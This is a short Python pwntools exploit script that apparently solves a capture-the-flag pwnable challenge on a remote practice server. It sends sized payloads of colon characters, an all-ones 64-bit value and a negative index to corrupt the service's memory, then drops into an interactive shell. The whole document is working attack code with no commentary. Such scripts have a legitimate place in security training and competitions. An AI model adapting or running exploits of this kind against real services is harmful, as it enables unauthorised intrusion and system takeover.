from pwn import *
debug = 0
if not debug:
    sh = remote('svc.pwnable.xyz', 30021)
else:
    sh = process('./challenge')


sh.sendafter('> ', '2')
sh.sendafter(': ', 'https////')
payload = ':'*0x7e
sh.sendlineafter(': ', '0x7e')
sh.send(payload)
sh.sendafter('> ', '2')
sh.sendafter(': ', 'https////')
sh.sendlineafter(': ', '0x79')
payload2 = ':'*0x79
sh.send(payload2)
sh.sendafter('> ', '2')
sh.sendafter(': ', 'https////')
sh.sendlineafter(': ', '0x8')
payload2 = p64(0xffffffffffffffff)
sh.send(payload2)
sh.sendafter('> ', '1')
sh.sendafter(': ', '-1')
sh.sendafter('> ', '4')
sh.interactive()


